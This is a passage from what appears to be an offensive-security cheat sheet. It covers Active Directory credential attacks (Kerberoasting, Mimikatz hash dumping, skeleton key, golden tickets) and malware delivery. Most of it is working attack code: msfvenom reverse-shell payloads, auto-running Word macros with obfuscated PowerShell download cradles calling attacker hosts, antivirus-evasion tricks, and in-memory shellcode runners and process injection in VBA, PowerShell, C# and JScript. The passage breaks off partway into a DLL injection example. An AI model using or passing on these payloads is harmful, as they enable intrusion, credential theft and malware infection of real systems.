If Invoke-Kerberoast.ps1 used:
```
hashcat -m 13100 --force hash.hash /usr/share/wordlists/rockyou.txt
```

**Crack the servers account hash:**

```
GetUserSPNs.py whiterose.local/ealderson:Password123 -dc-ip 192.168.92.130 -request
```
</details>

## ASREP Roast
Get the TGT for users that have 'pre-authentication' set to not required. Basically we get the encrypted hash and try to crack it offline
See:

* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast
* https://tools.thehacker.recipes/impacket/examples/getnpusers.py
* https://medium.com/@markmotig/dump-password-hashes-for-offline-cracking-by-forcing-as-rep-roasting-ca43f6e76cdd


```
impacket-GetNPUsers jab.htb/ -usersfile pidgin_users.txt -format hashcat -outputfile hashes.asreproast
hashcat -m 18200 hashes.asreproast rockyou.txt
```

## cPassword / Group Policy Preferences (GPP) Attacks

:information_source: GPP's allowed admins to create policies using embedded credentials. These credentials were encrypted and placed in a 'cPassword'. The key was accidentally released. Patched with MS14-025 but does not prevent the previous uses. If the policy was set before this was patched. [Blogpost](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)

:information_source: Check if vulnerable with metasploit using smb_enum_gpp.

:information_source: You can test this attack using the retired machine 'Active' on HackTheBox

Get Groups.xml from SYSVOL or \Replication share and check for cPassword.

```
gpp-decrypt <cPassword-Hash>
```

## Mimikatz

[Github Page](https://github.com/gentilkiwi/mimikatz)

:information_source: Tool used to view and steal credentials, generate kerberos tickets, leverage attacks and dump credentials stored in memory. Not working every time due to cat and mouse game between developers and windows.

**Dump Hashes:**

Run mimikatz on DC and run the following commands to dump hashes.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam 
mimikatz # lsadump::sam /patch
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::dcsync /user:Administrator # domain admin privilege needed, triggers domain controller synchronization (NTDS.dit)
```

In case you do not have a proper shell try:
```
.\mimikatz "sekurlsa::logonpasswords" exit
```

## Skeleton Key
By executing Mimikatz on the DC we can elevate privileges and gain persistence once you have established yourself in the domain.
Through the skeleton key we inject into LSASS and create a master password that will work for any account in the domain. Existing passwords will also continue to work, so it is very difficult to know this attack has taken place.

See also https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/skeleton-key

Running mimikatz remotely on DC:
```
PsExec.exe \\myDC.local -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privlege::debug" "misc::skeleton" ^& "exit")
```

If everything worked every user account has now the master password 'mimikatz'. As mentioned the regular password is still valid.

## Golden Ticket Attack
When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt. By getting the krbtgt password hash one is able to create custom TGTs (golden tickets)

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt 
# look for NTLM hash for User krbtgt
```

Copy S-ID of the domain and NTLM hash of TGT-Account.

```
mimikatz # kerberos::golden /User:Administrator /domain:whiterose.local /sid:S-1-5-21-301242389-3840584950-2384549833 /krbtgt:64f12cdda88057e06a81b54e73b949b /id:500 /ptt
mimikatz # misc::cmd # to launch new command prompt

> psexec.exe \\dc01 cmd.exe
```
:information_source: Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication. If we were to connect using PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked. Therefore the following would not work!
```
> psexec.exe \\10.10.10.100 cmd.exe
```

# Client Side Attacks
## SharpShooter
[SharpShooter](https://github.com/mdsecactivebreach/SharpShooter) is a payload creation framework for retrieval and execution of arbitrary C# source code.

Generate shellcode:
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f raw -o shell.txt
```

Generate JScript payload
```
python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test
```

## HTML Applications
If a file is created with the extension of .hta instead of .html, Internet Explorer will automatically interpret it as a HTML Application and offer the ability to execute it using the mshta.exe program

POC: 
```
<html>
<body>

<script>

  var c= 'powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC...d7Ks'; 
  new ActiveXObject('WScript.Shell').Run(c);
  
</script>

</body>
</html>
```
Craft payload
```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o payload.hta
```

## HTML Smuggling
HTML Smuggling is used that when a victim visits a malicious site, a file is automatically downloaded.

Create payload
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -o msfstaged.exe
```
Then base64 encode the msfstaged.exe file and assign the blob to the variable ``file``

```
<html>
    <body>
        <script>
          function base64ToArrayBuffer(base64) {
    		  var binary_string = window.atob(base64);
    		  var len = binary_string.length;
    		  var bytes = new Uint8Array( len );
    		  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
    		  return bytes.buffer;
      		}
      		
      		var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...'
      		var data = base64ToArrayBuffer(file);
      		var blob = new Blob([data], {type: 'octet/stream'});
      		var fileName = 'msfstaged.exe';
      		
      		var a = document.createElement('a');
      		document.body.appendChild(a);
      		a.style = 'display: none';
      		var url = window.URL.createObjectURL(blob);
      		a.href = url;
      		a.download = fileName;
      		a.click();
      		window.URL.revokeObjectURL(url);
        </script>
    </body>
</html>
```

## Microsoft Office

### Executing PowerShell in Word using VBA 
<details>
  <summary>Expand</summary>

Create payload:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta
```
Since VBA has a 255-character limit for literal strings we need to split the command we want to execute into multiple lines
```
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```
VBA macro:
```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
    Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
    Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
    Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
    Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
    ...
    Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
    Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
    Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
    Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
    Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
    Str = Str + "QA="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

We can also host an executable and just download and execute it within the VBA macro:
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

Lot of AV's detet the 'Shell str' method since we are spawning a subprocess from word which is suspicious. 
We can dechain ourself from word by using WMI.
Replace the MyMacro function with the following:

```
Sub MyMacro()
    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://10.10.10.10/run.txt'))"
		GetObject("winmgmts:".Get("Win32_Process").Create strArg, Null, Null, pid
End Sub
```

Additional Obfuscation: Add 'encryption' for the download cradle, like simple caesar cipher

PowerShell code to generate encrypted payload

```powershell
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"

[string]$output = ""

$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip

```

Now add functions to decrypt to the VBA code:

```
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function
```

Then use it like

```
Function MyMacro()
    Dim Apples As String
    Dim Water As String
    
    Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058"
    Water = Nuts(Apples)
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function
```

As a last step, to avoid heuristic scans, check for the filename since a lot of AV products rename the doc during runtime.
Similar bypass are sleep timers and non-emulated APIs (See 14_Antivirus_Evasion.md)
You can also do this with the functions above (encrypted)

```
If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
  Exit Function
End If
```

</details>

### Executing Shellcode in Word Memory using VBA

<details>
  <summary>Expand</summary>
To execute shellcode in memory we will take use of the three Win32 API's

**VirtualAlloc:**

Used to allocate memory. [Link](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)


```
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```
|Variable [Data Type]|Description|
|--------------------|-----------|
|lpAddress [LongPtr]| memory allocation address (set to 0, API will choose location)|
|dwSize [int]| size of allocation|
|flAllocationType [int]| allocation type (e.g. 0x3000 => [MEM_COMMIT and MEM_RESERVE](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), in VBA: &H3000)|
|flProtect [int]| memory attribute (0x40 means the memory is readable, writable and executable, in VBA: &H40) |
|return value [LongPtr]| memory pointer|


* Integers can be translated to ``Long``
* dwSize can be hardcoded or set dynamically using ``UBound``: ``UBound(buf)``. [Link](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/ubound-function), also see ``LBound`` [Link](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/lbound-function)

**RtlMoveMemory:**

After allocating memory we must copy our desired shellcode bytes into this memory location (executable buffer). This is done using ``RtlMoveMemory``. 

```
VOID RtlMoveMemory(
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T         Length
);
```

|Variable [Data Type]|Description|
|--------------------|-----------|
|destination pointer [LongPtr]| memory pointer, points to newly allocated buffer|
|source buffer [Any]|address of an element from the shellcode (passed by reference)|
|length [Long]| length of shellcode to be copied (passed by value)|
|return value [LongPtr]| memory pointer|

**CreateThread:**

After copying the shellcode into the executable buffer, we can execute it with ``CreateThread``. [Link](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)

```
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  SIZE_T                  dwStackSize,
  LPTHREAD_START_ROUTINE  lpStartAddress,
  LPVOID                  lpParameter,
  DWORD                   dwCreationFlags,
  LPDWORD                 lpThreadId
);
```

|Variable [Data Type]|Description|
|--------------------|-----------|
|lpThreadAttributes [Long] | non-default setting, can be set to "0"|
|dwStackSize [Long] | non-default setting, can be set to "0"|
|lpStartAddress | start address for code execution, address of our shellcode buffer|
|lpParameter | pointer to arguments for the code residing ad start address|  

* Most arguments are not needed and can be set o "0"
* lpParameter can be "0" since our shellcode does not require arguments

**Generate Shellcode:**
```
msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f vbapplication
```

EXITFUNC=thread because our shell would be killed when office is closed, metasploit's AutoMigrade module would solve this also. 

**Entire VBA Code:**
```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
...
49, 57, 50, 46, 49, 54, 56, 46, 49, 55, 54, 46, 49, 52, 50, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
To work as expected, this requires a matching 32-bit multi/handler in Metasploit with the EXITFUNC set to "thread" and matching IP and port number.

</details>

### Executing Shellcode in Word Memory using Powershell

<details>
  <summary>Expand</summary>

Generating Shellcode
```
msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=3141 EXITFUNC=thread -f ps1
```

Save the following script as run.ps1 and host it on port 80

```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```
We use WaitForSingleObject to instruct powershell to wait forever or until we exit our shell (0xFFFFFFFF).
Otherwise our shell dies as soon as the parent powershell process terminates. The shell is basically terminatedb before it even starts.

VBA Code
```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
The Add-Type keyword lets us use the .NET framework to compile C# code but the compilation process is performed by the Visual C# Command-Line Compiler (csc).
During this process the source code and the compiled C# assembly are temporarly written to disk.

With the following function we are able to resolve any Win32 API without using the Add-Type keyword and therefore completly avoid writing to disk.

```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
```
We can now create the DelegateType with the address (example: MessageBoxA). Then we call GetDelegateForFunctionPointer to link the function address and the DelegateType and invoke MessageBox.

```powershell
$MessageBoxA = LookupFunc user32.dll MessageBoxA
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, 
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 
  'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
  'RTSpecialName, HideBySig, Public', 
    [System.Reflection.CallingConventions]::Standard, 
      @([IntPtr], [String], [String], [int]))
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 
  'Public, HideBySig, NewSlot, Virtual', 
    [int], 
      @([IntPtr], [String], [String], [int]))
$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
$MyDelegateType = $MyTypeBuilder.CreateType()

$MyFunction = [System.Runtime.InteropServices.Marshal]::
    GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)
$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)
```

Based on this we will create a function (getDelegateType) for better usability.
Entire run.ps1 script that does not write any file to disk (completely within memory)

```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```
</details>

## Windows Script Host

Windows has default apps for opening certain file types. This can be viewed under: Settings > Apps > Default apps
Note that for example powershell files are opened with notepad by default. Javascript Files are getting opened by the Windows Script Host and therefore are executing when double clicked.

Important Info: Jscript will execute in a 64-bit context by default so we have to generate a 64-bit payload (in csharp format).

Note VisualStudio: Console App (.NET Framework), C#

### Dropper in JScript
```javascript
var url = "http://10.10.10.10/bin.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("bin.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("bin.exe");
```
Use [setProxy](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms760236%28v%3dvs.85%29) to make it proxy aware.

### Running JScript in Memory
Since there's no known way to invoke the Win32 APIs directly from Jscript, we'll instead embed a compiled C# assembly in the Jscript file and execute it.
To get a JScript file we will use [DotNetToJScript](https://github.com/tyranid/DotNetToJScript).

**DotNetToJScript:**

<details>
  <summary>MessageBox Example</summary>
1. Download DotNetToJScript project from [github](https://github.com/tyranid/DotNetToJScript))
2. Open in Visual Studio
3. Navigate to the Solution Explorer and open ``TestClass.cs`` under the ExampleAssembly project.
4. Paste the C# code (see below)
5. Switch from Debug to Release mode and then: Build > Build Solution
6. From DotNetToJScript folder copy ``DotNetToJscript.exe`` and ``NDesk.Options.dll`` to ``C:\Temp``
7. From the ExampleAssembly folder copy ``ExampleAssembly.dll`` to ``C:\Temp`` 

C# code:
```csharp
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
        MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

Command:
```
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
```


</details>

**Win32 API Calls From C#:**

<details>
  <summary>Expand</summary>

MessageBox Example:
First we look up MessageBox on [www.pinvoke.net](http://pinvoke.net/default.aspx/user32/MessageBox.html)
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);

        static void Main(string[] args)
        {
             MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0);
        }
    }
}
```
</details>

**Shellcode Runner in C#:**


<details>
  <summary>Expand</summary>

We combine VirtualAlloc, CreateThread, and WaitForSingleObject to execute shellcode in memory

Generate shellcode:

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=3141 -f csharp
```

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[630] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
  ...
  0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
Note: Set CPU to x64 before building the

</details>

**Jscript Shellcode Runner:**

<details>
  <summary>Expand</summary>

C# code:
```csharp
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {
        MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        byte[] buf = new byte[626] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8...
    
        int size = buf.Length;
    
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
    
        Marshal.Copy(buf, 0, addr, size);
    
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    
        WaitForSingleObject(hThread, 0xFFFFFFFF);

    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

Command:
```
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```
</details>


# Process Injection and Migration

## Process Injection in C#
Create 64-bit meterpreter staged shellcode with msfvenom in csharp format.
```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=3141 -f csharp
```


Open Visual Studio and create a .NET standard Console App.
Note: 4804 is the process ID of exporer.exe but this changes after each login and varies by machine. Get the ID through Process Explorer (SysInternals)
```
using System;
using System.Runtime.InteropServices;


namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        static void Main(string[] args)
        {
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            byte[] buf = new byte[591] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            ....
            0x0a,0x41,0x89,0xda,0xff,0xd5 };
                        IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```
Set CPU architecture to 64-bit and compile

## DLL Injection
Process Injection allows to inject shellcode into a remote process and execute it. This is suitable for shellcode but for larger codebases or pre-existing DLLs, we want to inject an entire DLL into a remote process.

### DLL Injection with C#

<details>
  <summary>Expand</summary>
Generate DLL with msfvenom:
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f dll -o shell.dll
```

Open Visual Studio and create a .NET standard Console App.
```
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    class Program
    {
